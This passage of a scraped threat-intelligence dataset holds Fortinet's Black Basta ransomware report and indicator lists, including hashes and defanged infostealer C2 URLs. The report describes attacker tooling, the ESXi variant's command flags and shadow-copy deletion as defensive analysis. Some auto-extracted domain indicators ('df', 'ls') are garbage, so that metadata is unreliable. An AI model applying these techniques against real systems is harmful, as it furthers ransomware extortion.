ThirdEye Infostealer 847cbe9457b001faf3c09fde89ef95f9ca9e1f79c29091c4b5b08c5f5fe48337 ThirdEye Infostealer c36c4a09bccdeda263a33bc87a166dfbad78c86b0f953fcd57e8ca42752af2fc ThirdEye Infostealer 0a798b4e7bd4853ec9f0d3d84ad54a8d24170aa765db2591ed3a49e66323742c ThirdEye Infostealer a9d98b15c94bb310cdb61440fa2b11d0c7b4aa113702035156ce23f6b6c5eecf ThirdEye Infostealer 263600712137c1465e0f28e1603b3e8feb9368a37503fa1c9edaaab245c63026 ThirdEye Infostealer 610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2 ThirdEye Infostealer hxxp://shlalala[.]ru/general/ch3ckState ThirdEye Infosteler C2 hxxp://ohmycars[.]ru/general/ch3ckState ThirdEye Infosteler C2 hxxp://anime-clab[.]ru/ch3ckState ThirdEye Infosteler C2 hxxp://glovatickets[.]ru/ch3ckState ThirdEye Infosteler C2 FortiGuard Labs has created the following YARA rule to identify the ThirdEye Infostealer. infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-fast-developing-thirdeye-infostealer-pries-open-system-information",
      "scraped_at": "2025-07-20T13:55:43.014216",
      "indicators": {
        "ip_address": [],
        "domain": [
          "df",
          "ls"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796",
          "847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337",
          "5d211c47612b98426dd3c8eac092ac5ce0527bda09afa34b9d0f628109e0c796",
          "610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2",
          "C36C4A09BCCDEDA263A33BC87A166DFBAD78C86B0F953FCD57E8CA42752AF2FC",
          "c36c4a09bccdeda263a33bc87a166dfbad78c86b0f953fcd57e8ca42752af2fc",
          "2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F",
          "3d9aff07e4cb6c943aec7fcd2d845d21d0261f6f8ae1c94aee4abdf4eef5924d",
          "263600712137c1465e0f28e1603b3e8feb9368a37503fa1c9edaaab245c63026",
          "a9d98b15c94bb310cdb61440fa2b11d0c7b4aa113702035156ce23f6b6c5eecf",
          "0a798b4e7bd4853ec9f0d3d84ad54a8d24170aa765db2591ed3a49e66323742c",
          "9db721fa9ea9cdec98f113b81429db29ea47fb981795694d88959d8a9f1042e6",
          "f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494",
          "847cbe9457b001faf3c09fde89ef95f9ca9e1f79c29091c4b5b08c5f5fe48337",
          "2008bdd98d3dcb6633357b8d641c97812df916300222fc815066978090fa078f",
          "A9D98B15C94BB310CDB61440FA2B11D0C7B4AA113702035156CE23F6B6C5EECF"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5500550055005501
    }
  },
  {
    "id": "Fortinet_25885",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Black Basta",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Black Basta ransomware. Affected platforms:Microsoft Windows, VMWare ESXi serversImpacted parties:Microsoft Windows and ESXi UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Over the past few months, Black Basta ransomware has made headlines for allegedly compromising high-profile European and North American organizations across a variety of industries, such as outsourcing, technology, and manufacturing. The history of Black Basta ransomware dates back to at least April 2022, with a professional organizations company in the United States being one of its first victims. Since then, Black Basta has slowly expanded their operations, with the group allegedly compromising and stealing data from a US government contractor and a US aerospace and defense company in late 2022. This ransomware is considered a successor to the now-defunct Conti ransomware because some former Conti members are believed to be in the Black Basta group. Some also believe there is a potential connection between Black Basta and the Fin7 threat actor due to the groups' similar Tactics, Techniques, and Procedures (TTPs). Black Basta operates a Ransomware-as-a-Service (RaaS) model, in which the developers offer a service such as ransomware, an infrastructure for payment processing and ransom negotiation, and technical support to its affiliates. Once an affiliate gets a victim to pay a ransom, the Black Basta operator receives a portion. Affiliates are responsible for selecting their targets, moving laterally across a victims’ network (often by using tools supplied by ransomware operators, leveraging dual-use tools, and employing living-off-the-land tactics), stealing data, and deploying the ransomware. Tools reportedly used by Black Basta threat affiliates include PsExec, Windows Management Instrumentation (WMI), PowerShell, Netcat, BITSAdmin, BCDEdit, SystemBC, Mimikatz, ColbaltStrike, Brute Ratel C4, remote access tools, and RClone. Before deploying the ransomware to compromised networks, Black Basta attackers install and configure the open-source file-transfer utility “RClone” to steal the data that they collected. The stolen data is then used for their double-extortion scheme, where the files are leaked to the public if a victim fails to meet the ransom demands. The Black Basta ransomware was initially only supported on Windows platforms. However, the Black Basta developer released a new variant targeting ESXi systems in 2022. The group also updated and released Black Basta ransomware 2.0, which reportedly incorporates a new encryption algorithm. Note that FortiGuard Labs previously released a Threat Signal for Black Basta ransomware on May 2nd, 2022: Black Basta has been seen to use techniques from spearphishing to purchasing access through Initial Access Brokers (IABs) to gain initial access. Access has also been obtained using malware from other groups, such as QakBot (QBot). The exploitation of the PrintNightmare (CVE-2021-34527) and Follina (CVE-2022-30190) vulnerabilities have also been reported. More details on CVE-2021-34527 and CVE-2022-30190 are available as Outbreak Alerts previously released by FortiGuard Labs: FortiGuard Labs is aware that the ransomware component of Black Basta has been compiled as a Windows executable, more recently as a Windows DLL, and additionally as a Linux executable The functionality between the two versions is identical, as is the final step in the attack chain. Black Basta has been observed using the XChaCha20 stream cipher (https://en.wikipedia.org/wiki/ChaCha20-Poly1305) to encrypt its files. This is built into the software using the Crypto++ C++ library (https://www.cryptopp.com/). Files are encrypted quickly using multi-threading, with the file extension for encrypted files being unique for each ransomware build. The ransom note is assembled and dropped into each directory that includes files that have been encrypted. Note in Figure 6 that the Login ID (the ID used by the threat actor to identify the victim when they make contact) is hardcoded into the ransomware, which suggests some customization for a particular victim. The ransom note labeled “Instructions_read_me.txt” is automatically opened in Notepad so the victim can easily see it. The note demands that the victim use Tor to contact the ransomware gang = at a specified “.onion” site. Instructions for downloading and installing the Tor browser are provided. It also suggests that the victim not contact a recovery company or outside ransom negotiators. Black Basta has also developed a Linux executable primarily designed to target VMWare ESXi deployments rather than more general individual Linux systems. This can be easily shown by running the ransomware on a non-ESXi deployment. When executed, the malware will be unable to locate the “/vmfs/volumes/” directory and be unable to run. This directory (VMFS is the “Virtual Machine File System,” and “volumes” is where VM disk images reside, which would be the main target of the ransomware). If that folder is then put in place, it will execute (although nothing will occur on a non-ESXi host). The Linux version of Black Basta has several command line flags that suggest it is designed to be executed by an individual who has remote access to a victim ESXi server. Again, executing in a non-ESXi environment fails. However, it allows for the tracing of the event in assembly. The “-killesxi” command triggers a fairly involved Bash sequence, as shown in Figure 12 below. As ESXi installations are the primary focus of the Black Basta Linux variant, it is only interested in four related file types for encryption: “.vmsd”, “.vmx”, “vmxf”, and “vmdk”. As with the Windows version, the Linux version of Black Basta hardcodes the file extension for encrypted files into the code for deployment, and it changes from file to file. Whether using the “-forcepath” command line flag to encrypt a single, non-standard directory with files of interest or the default location of “/vmfs/volumes/”, this version will encrypt files as efficiently as the Windows version. The ransom note for the Linux version of Black Basta is identical to the Windows version. Again, the victim must contact the gang at a specified “.onion” site. As the ransom notes above show, the Black Basta threat actors want their victims to contact them at a specific Tor address. Once there, the site requires the visitor to enter their “Login ID” from the ransom note to identify the organization they’re from, along with the completion of a captcha to prevent automated connections. In addition to the communication site, Black Basta operates a “name and shame” Tor site titled “Basta News”. This site provides the group’s “proof” that it has compromised a given organization, publication status, and visitor count. During our investigation, Black Basta’s data leak site listed more than 200 victims in North America and Europe. More than 60% of the alleged victims are U. S. organizations. Distant second place belongs to Germany at 15%, followed by Canada at close to 6%. We divided the victim list into four groups: older victims to newer victims. While the oldest victim group spreads across 12 countries, the second and third group victims include only eight countries. The latest victim group has only six countries (U. S., Germany, Canada, Italy, UK, Slovenia), which may indicate that Black Basta affiliates have narrowed the target list. As for its targeted industries, more than 25% of the victims listed on the leak site are in manufacturing, construction, service, and retail. However, 50% of the victims are in those four industries. Other affected sectors include legal, warehouse, finance, and IT. Based on what’s in the data leak site, over 80% of the victims suffered from some or all of their stolen data being leaked to the public. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Black Basta ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The following IPS signatures are in place for CVE-2021-34527 and CVE-2022-30190 respectively: FortiEDR detects and blocks the execution of Black Basta ransomware before it can execute. FortiEDR detects and blocks Black Basta ransomware from deleting volume shadow copies using the vssadmin utility with a security event triggered by the 'Suspicious Applicaiton' rule within the Ransomware Prevention security policy. FortiEDR detects and blocks Black Basta ransomware from encyrpting files within the \"file Encryptor - Suspicious File Modification\" rule in the Ransomware Prevention security policy. FortiEDR detects and blocks Black Basta ransomware from changing the desktop background a 'Modify OS Setting' event triggered by the 'Unconfirmed Executable' rule in the Ransomware Prevention security policy. Note:If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 0180364e7dd8b5440920f1a85330bc5ec7e80756cb633014846378b9a5c9debd Black Basta ransomware Black Basta ransomware Black Basta ransomware 03309c90e6c60a2e3cd44374efa3003ae10cd9e05ba6a39c77aa5289b32cb969 0595876dcfb02cbe4d85d3f9cb374b24473e5b338df781e18bd059ea48d60119 0825ae48606f05086efb7d2d03db4331a03e21017bdf1470cdc597c51381e6f5 08376a7b9bad22cc76ed74bcf1ff3c36fd26549c747e251980439074c0a22b65 09bc7247b50a166996b667b9a6e696cfbafa203ffcbec46ad0cca27deacd5c25 0bce6dc27d2cbdc231b563427c3489ddc69a0a88012abccd49b32c931dd93a81 0d6c3de5aebbbe85939d7588150edf7b7bdc712fceb6a83d79e65b6f79bfc2ef 10cd56acdf1bc7e91610f18583c4f88dc2f64a3caaf4faa8a3bccf3938599245 1354254499b2e3353708747d36c334074f40c1f726ea7590384f2192c972f8c3 1391c20a26f248f7c602f20096bf1886cfe7e4d151602a1258a9bbe7c02c1c80 1552079359d5e51fb862c3be8cc0dacaa5ae39b43255b87a9c185414944f8c43 15560b1e35a3a8612a7ba91d00dea6b8dd6e4f3f857399c22c0c75377c9b31a2 158e40a0009e6602303952694df6f3a49f40705c7ceb8b85854c0f1733aa2963 15abbff9fbce7f5782c1654775938dcd2ce0a8ebd683a008547f8a4e421888c4 17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90 1a8a283732f920d34233eac14ab03d681f3837b2e759df4ff1dd383249074e46 1bb7e645d4ff753157bbdd78829276356cb6660a767ab7158fc7dec3fe8b0e2f 1c711ca465dace4d2a8d0542e75410c417375c4ee484294fcd959e99651fccb8 1dd04aab97d6b65ac93ae3e8cfb4d3175d99f5b0395418abeb771d2db364cd3c 1ed076158c8f50354c4dba63648e66c013c2d3673d76ac56582204686aae6087 203d2807df6ef531efbec7bfd109986de3e23df64c01ea4e337cbe5ba675248b 21033cd24a9d775d7daa7bbc5c5b007553f205ac0febb6bae3fa35c700676bda 22aba8e0bdbc9d50f6070ec50405c8ef31e5e22ad18fa9cc94d137fee0dd0536 2327018dab0e3beaed2123bcb5392405ab1e502dfa72a5a32c2c164346bb9bc6 240450721e47d4cabc1d15d074f0a3a7b3e0b9f1a791006046e211ec302c28b0 245af5ac27f701bf320971c69f9317b37faaac228731a77fb06ad9944c9b6772 2558d0817586306d0ddf7beadd371785cd0a0b7ed860ac62760dbbc92866008a 2e2ec16d0b77bddbc2e88a0a914e7466a3c9dee38dc73a66dddd005e92bb3d6e 2edcf98e7031dad7d90df525db2951b83b2a82de57dfe853c98eaedb609e49c4 2f8796499a7df61817126eb00c8aedff7b709f7f652503b2b9bd1c6a2f7f61e4 31e2288f0dd395423c22d2d20c9562211e97a2ab06d2403cf020203abe835993 3276df5b3b112c052d56919ad33de8404ec1a37d47d2c28d9debf8323df22e16 350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd 41b3d0d4419eac75017e76fe3bd76ec6a968cb68af4cf6335a27a196c47bac25 434a4f21549a1ae3dd623bfbc084d43c330821a279b2f4a4abdc7ca6e5584bfb 43e43276e250fc8a971fc3f0308827f98df09c52c08a09577b0cf636e9dc65ed 43f475bfa1f2c4fc35f08e6a96ca9698bd6f86357564d82436555e0f43aeff1a 47df319462909cbbcc0f2c1ab1fc4eec5363cae8344f9e4033542f221da97677 49ec36f03629f5993e496cfee6c5274c5f1db49bde704ef77ffe05fedd60e82b 4b83aaecddfcb8cf5caeff3cb30fee955ecfc3eea97d19dccf86f24c77c41fc4 4fa2e370c3e78afb50cdeac32b9b4f3e5262312b04b461d05ff73678f5526530 50d2d4c05bf810c1b57dd93f41430ddcd93838cc5367ed2c81de4563f59860c9 51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e 5211ad84270862e68026ce8e6c15c1f8499551e19d2967c349b46d3f8cfcdcaa 5c6c40ddb666fe8b3a85fef39b6594337ebc6607b5eb9a4f16a62efc4402a0cb 5caa3f9665561b5b02f944cc33fb12faaec87d6ccb69af6a12d0f82cd0a5981d 5dcbec6d3370a2af103500325279d0c4f53df4c5a0c85b20a467797e61cb75ae 5ed057e99aed8356ccdf698f38fd3fe9ceabe517e1bd3245479fdd3cbb966fa9 60e9e8e25b64eabb59dc8667c286d91a8f4c6b6f9ea9aa12b55e7a2cb78d15f8 6264cae0ef62128667a295aef7154f4feb22dbfe53fc09fd01d122e01d43995e 645a18f737bd6d810a48c4a47ace62c196eb1ef285f8ca9bea6218b312fff16e 64921e6be1c8f44fddc6075621357496561924acecce48b73a243d5534c8d36e 653da5127b0ecbc5c373ce510c0d5191f61f2df912c9b6f4989aa3775933bc33 6b7d80a4e6b7b6d2a74f135313473415ecbbd7382688d0b536a7df6a7ccb2bab 6c0690782c3bfd790eddf460cba5b89769d740e78db90b56a54964ebffc9fb17 6cd7c9fa8314f2d7fb6819df38cffa1cccbd6f41b54c81bc6a667693351b3058 6cd92db9ebc8a8a879d86002971b93562928eca738a2fe14228479cb6cc1fe33 6cf61f55d7c40c703289b5692f7563c01d7bad54a2f5baf378a0e866622368e6 6def732c9ae7a4ce0dfd9d711033eed64fb5f481b56768c374289572c2743a0f 6ecd381ce0d3ad1ab83147712aa34772351e4d2dc43e1b66e3a999340e2b7f17 70161408185668a27da9d35ce4127003bda1acb6e31d9b01b576e64c17ec07cf 723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224 75f247f236a1f650c607e27d13b1c769340263f6b8caac946b0f1dacc5180b78 764b1117262d33f0a69b4f4c72fad607b7c71c262f60b9b2b35a21e7f4967786 7883f01096db9bcf090c2317749b6873036c27ba92451b212b8645770e1f0b8a 7ab838960858870eaf2701a737411c6a65e00077136d938f4ef736b3c949833d 811e64d302089f4cb3cf7922c4310a1a00ef0a71c44ff402c1bf35c49c481f9e 81515e1c72fadae2c4bb15883e0c1d8979b49fd52d8c65ca03e05a75ca6683c9 83fc7095a91dc016bdbd965ae09182ea1d1a5b287cbfa4b0f3a58754336c8c33 856b5dc509c17f5be68186b6a8ab272fc0dd12000c978548d8488ee997b015e5 882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3 8ded024d7fb62074d19cb9a364ca34646df42c971b9208227abc8bcb454d49f5 9770b4425a2c68ac8a861f3d5b484fad3c7bd7ea7a763248ad841821e19a01bc 97a997a2a3b270a4db3b56fec30319bc0f41f069a5089c47f08e4c554bf3ac32 99f82c9a80fc6556f28e50e2889d59325e8169dc3742bf34121dc85207c6d965 9b57d94b33cd712bf409e0128f26a75d2d9746ef65012ce6cd72caf47650d2a6 a083060d38984e7c6f36dcd2c57ec1aa3f50f9c201c8538257c8cbf2b3217e96 a252719d1712ec5aa37a8ce6e84474584c7d8d8221fa5aa033f32f5f5cf6d484 aa9f5321e9c5bede88d8f50342e9420f9ace7711950c9fae8536a0d5586ef86d ab24df3877345cfab2c946d8a714f1ef17fe18c6744034b44ec0c83a3b613195 ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e af75686852f329855981dd5953ff8ce40e713e6ef720ac26816091f40fede1a8 affcb453760dbc48b39f8d4defbcc4fc65d00df6fae395ee27f031c1833abada b18b40f513bae376905e259d325c12f9d700ee95f0d908a4d977a80c0420d52e b4749c9a449bc87703dda9db60e4562f0bd02c055c49c14704ed2d1e2eb0f4f6 b95487d9ee09dba89976b9b61b3eeb82f72972f270ca149ac0e2e1ea35640d5f c4c8be0c939e4c24e11bad90549e3951b7969e78056d819425ca53e87af8d8ed c5320ee1e5753c5cec7611e4c61aaf23778b5924aefac3a546318de7319581bc c532d28f9700abba1a4803c3a9d886c8c4fb26f84cf2399c533d68cfdcec4fa7 cb0848a6f24a6a37bbceffa8dedade918f3a0717ceeff63bbb997b608823214f cce74c82a718be7484abf7c51011793f2717cfb2068c92aa35416a93cbd13cfa cf7fa7f54b06b09b750b8c50e4f8893e25ceaccfa9be8225f3279dc4e4ce0f4d d0f05cd6957e1e93d1ca4154762b4d4bcaeb16c0bf878b59a1500c4974ef4502 d1949c75e7cb8e57f52e714728817ce323f6980c8c09e161c9e54a1e72777c13 d408fe3421f520710e8a6ac6f0b9a1759b03ab3f44134e451d72af3bb79a3ad0 d5770cd6451de0c45426fae230e41f3551af1c9dda690d2be44f69be3721d929 dc90ba17158501e8f6589d3805789f9ac51cefaafec63d6e00e10c7e0355faab dd32c037ed9b72acb6eda4f5193c7f1adc1e7e8d2aefcdd4b16de2f48420e1d3 df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415 e05791112b72f7430b74138bac4d4efcd2fbd1909714f8366a43eab77b26b13e e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757 e686a6e3b9598c588202794f7670c2356e7bc80ecb69113eb3062ae4b57e7396 e9fefd053b8c77c7db13d528b97d2b974dfd86775a8cc9c53b8efdb07db8842c eb758d64b49aec914b175165f232aeb8928a841566c083114e97844841afd82c ef2a754a8e713fd6deaa642e2220af372fd310a755a02126938ff233b16a4a83 f0addbafed09fa1d3a5edfe56356475f1af5d711403c800617bcde9b22585d24 f4f471241714fbf24a103f8a7fce00fecdf795dbf6edbc6420e34834cb93eb53 f79188b716aeb2eaa34bce17f066aca3bbdf676b7977fe36b8277fd651dea251 fbe5690e3a17947a9e208a1730d08e2496f27e1c62cac146fb567c63d781a1b6 fe87fa7714266548fa5da52455f1788f588417ee800c86768d163abd279d0279 fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,fortiguard labs,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-black-basta",
      "scraped_at": "2025-07-20T13:55:52.114219",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ww",
          "n"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "50d2d4c05bf810c1b57dd93f41430ddcd93838cc5367ed2c81de4563f59860c9",
          "5dcbec6d3370a2af103500325279d0c4f53df4c5a0c85b20a467797e61cb75ae",
          "60e9e8e25b64eabb59dc8667c286d91a8f4c6b6f9ea9aa12b55e7a2cb78d15f8",
          "1391c20a26f248f7c602f20096bf1886cfe7e4d151602a1258a9bbe7c02c1c80",
          "653da5127b0ecbc5c373ce510c0d5191f61f2df912c9b6f4989aa3775933bc33",
          "fbe5690e3a17947a9e208a1730d08e2496f27e1c62cac146fb567c63d781a1b6",
          "203d2807df6ef531efbec7bfd109986de3e23df64c01ea4e337cbe5ba675248b",
          "e05791112b72f7430b74138bac4d4efcd2fbd1909714f8366a43eab77b26b13e",
          "43e43276e250fc8a971fc3f0308827f98df09c52c08a09577b0cf636e9dc65ed",
          "aa9f5321e9c5bede88d8f50342e9420f9ace7711950c9fae8536a0d5586ef86d",
          "15abbff9fbce7f5782c1654775938dcd2ce0a8ebd683a008547f8a4e421888c4",
          "1bb7e645d4ff753157bbdd78829276356cb6660a767ab7158fc7dec3fe8b0e2f",
          "10cd56acdf1bc7e91610f18583c4f88dc2f64a3caaf4faa8a3bccf3938599245",
          "43f475bfa1f2c4fc35f08e6a96ca9698bd6f86357564d82436555e0f43aeff1a",
          "6c0690782c3bfd790eddf460cba5b89769d740e78db90b56a54964ebffc9fb17",
          "49ec36f03629f5993e496cfee6c5274c5f1db49bde704ef77ffe05fedd60e82b",
          "2f8796499a7df61817126eb00c8aedff7b709f7f652503b2b9bd1c6a2f7f61e4",
          "9b57d94b33cd712bf409e0128f26a75d2d9746ef65012ce6cd72caf47650d2a6",
          "b18b40f513bae376905e259d325c12f9d700ee95f0d908a4d977a80c0420d52e",
          "1dd04aab97d6b65ac93ae3e8cfb4d3175d99f5b0395418abeb771d2db364cd3c",
          "2327018dab0e3beaed2123bcb5392405ab1e502dfa72a5a32c2c164346bb9bc6",
          "81515e1c72fadae2c4bb15883e0c1d8979b49fd52d8c65ca03e05a75ca6683c9",
          "dc90ba17158501e8f6589d3805789f9ac51cefaafec63d6e00e10c7e0355faab",
          "6def732c9ae7a4ce0dfd9d711033eed64fb5f481b56768c374289572c2743a0f",
          "0d6c3de5aebbbe85939d7588150edf7b7bdc712fceb6a83d79e65b6f79bfc2ef",
          "5c6c40ddb666fe8b3a85fef39b6594337ebc6607b5eb9a4f16a62efc4402a0cb",
          "eb758d64b49aec914b175165f232aeb8928a841566c083114e97844841afd82c",
          "764b1117262d33f0a69b4f4c72fad607b7c71c262f60b9b2b35a21e7f4967786",
          "dd32c037ed9b72acb6eda4f5193c7f1adc1e7e8d2aefcdd4b16de2f48420e1d3",
          "affcb453760dbc48b39f8d4defbcc4fc65d00df6fae395ee27f031c1833abada",
          "1354254499b2e3353708747d36c334074f40c1f726ea7590384f2192c972f8c3",
          "1ed076158c8f50354c4dba63648e66c013c2d3673d76ac56582204686aae6087",
          "51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e",
          "fe87fa7714266548fa5da52455f1788f588417ee800c86768d163abd279d0279",
          "5caa3f9665561b5b02f944cc33fb12faaec87d6ccb69af6a12d0f82cd0a5981d",
          "1a8a283732f920d34233eac14ab03d681f3837b2e759df4ff1dd383249074e46",
          "0825ae48606f05086efb7d2d03db4331a03e21017bdf1470cdc597c51381e6f5",
          "c5320ee1e5753c5cec7611e4c61aaf23778b5924aefac3a546318de7319581bc",
          "75f247f236a1f650c607e27d13b1c769340263f6b8caac946b0f1dacc5180b78",
          "1c711ca465dace4d2a8d0542e75410c417375c4ee484294fcd959e99651fccb8",
          "fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f",
          "ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e",
          "08376a7b9bad22cc76ed74bcf1ff3c36fd26549c747e251980439074c0a22b65",
          "d5770cd6451de0c45426fae230e41f3551af1c9dda690d2be44f69be3721d929",
          "47df319462909cbbcc0f2c1ab1fc4eec5363cae8344f9e4033542f221da97677",
          "2e2ec16d0b77bddbc2e88a0a914e7466a3c9dee38dc73a66dddd005e92bb3d6e",
          "c4c8be0c939e4c24e11bad90549e3951b7969e78056d819425ca53e87af8d8ed",
          "6cf61f55d7c40c703289b5692f7563c01d7bad54a2f5baf378a0e866622368e6",
          "3276df5b3b112c052d56919ad33de8404ec1a37d47d2c28d9debf8323df22e16",
          "245af5ac27f701bf320971c69f9317b37faaac228731a77fb06ad9944c9b6772",
          "856b5dc509c17f5be68186b6a8ab272fc0dd12000c978548d8488ee997b015e5",
          "b95487d9ee09dba89976b9b61b3eeb82f72972f270ca149ac0e2e1ea35640d5f",
          "ab24df3877345cfab2c946d8a714f1ef17fe18c6744034b44ec0c83a3b613195",
          "6ecd381ce0d3ad1ab83147712aa34772351e4d2dc43e1b66e3a999340e2b7f17",
          "811e64d302089f4cb3cf7922c4310a1a00ef0a71c44ff402c1bf35c49c481f9e",
          "8ded024d7fb62074d19cb9a364ca34646df42c971b9208227abc8bcb454d49f5",
          "e686a6e3b9598c588202794f7670c2356e7bc80ecb69113eb3062ae4b57e7396",
          "b4749c9a449bc87703dda9db60e4562f0bd02c055c49c14704ed2d1e2eb0f4f6",
          "22aba8e0bdbc9d50f6070ec50405c8ef31e5e22ad18fa9cc94d137fee0dd0536",
          "df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415",
          "7883f01096db9bcf090c2317749b6873036c27ba92451b212b8645770e1f0b8a",
          "2edcf98e7031dad7d90df525db2951b83b2a82de57dfe853c98eaedb609e49c4",
          "03309c90e6c60a2e3cd44374efa3003ae10cd9e05ba6a39c77aa5289b32cb969",
          "f79188b716aeb2eaa34bce17f066aca3bbdf676b7977fe36b8277fd651dea251",
          "0180364e7dd8b5440920f1a85330bc5ec7e80756cb633014846378b9a5c9debd",
          "41b3d0d4419eac75017e76fe3bd76ec6a968cb68af4cf6335a27a196c47bac25",
          "240450721e47d4cabc1d15d074f0a3a7b3e0b9f1a791006046e211ec302c28b0",
          "6cd92db9ebc8a8a879d86002971b93562928eca738a2fe14228479cb6cc1fe33",
          "af75686852f329855981dd5953ff8ce40e713e6ef720ac26816091f40fede1a8",
          "882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3",
          "0bce6dc27d2cbdc231b563427c3489ddc69a0a88012abccd49b32c931dd93a81",
          "723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224",
          "d1949c75e7cb8e57f52e714728817ce323f6980c8c09e161c9e54a1e72777c13",
          "f0addbafed09fa1d3a5edfe56356475f1af5d711403c800617bcde9b22585d24",
          "31e2288f0dd395423c22d2d20c9562211e97a2ab06d2403cf020203abe835993",
          "6264cae0ef62128667a295aef7154f4feb22dbfe53fc09fd01d122e01d43995e",
          "ef2a754a8e713fd6deaa642e2220af372fd310a755a02126938ff233b16a4a83",
          "2558d0817586306d0ddf7beadd371785cd0a0b7ed860ac62760dbbc92866008a",
          "21033cd24a9d775d7daa7bbc5c5b007553f205ac0febb6bae3fa35c700676bda",
          "6cd7c9fa8314f2d7fb6819df38cffa1cccbd6f41b54c81bc6a667693351b3058",
          "e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757",
          "350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd",
          "645a18f737bd6d810a48c4a47ace62c196eb1ef285f8ca9bea6218b312fff16e",
          "c532d28f9700abba1a4803c3a9d886c8c4fb26f84cf2399c533d68cfdcec4fa7",
          "4fa2e370c3e78afb50cdeac32b9b4f3e5262312b04b461d05ff73678f5526530",
          "15560b1e35a3a8612a7ba91d00dea6b8dd6e4f3f857399c22c0c75377c9b31a2",
          "5211ad84270862e68026ce8e6c15c1f8499551e19d2967c349b46d3f8cfcdcaa",
          "158e40a0009e6602303952694df6f3a49f40705c7ceb8b85854c0f1733aa2963",
          "9770b4425a2c68ac8a861f3d5b484fad3c7bd7ea7a763248ad841821e19a01bc",
          "64921e6be1c8f44fddc6075621357496561924acecce48b73a243d5534c8d36e",
          "434a4f21549a1ae3dd623bfbc084d43c330821a279b2f4a4abdc7ca6e5584bfb",
          "1552079359d5e51fb862c3be8cc0dacaa5ae39b43255b87a9c185414944f8c43",
          "70161408185668a27da9d35ce4127003bda1acb6e31d9b01b576e64c17ec07cf",
          "a252719d1712ec5aa37a8ce6e84474584c7d8d8221fa5aa033f32f5f5cf6d484",
          "cb0848a6f24a6a37bbceffa8dedade918f3a0717ceeff63bbb997b608823214f",
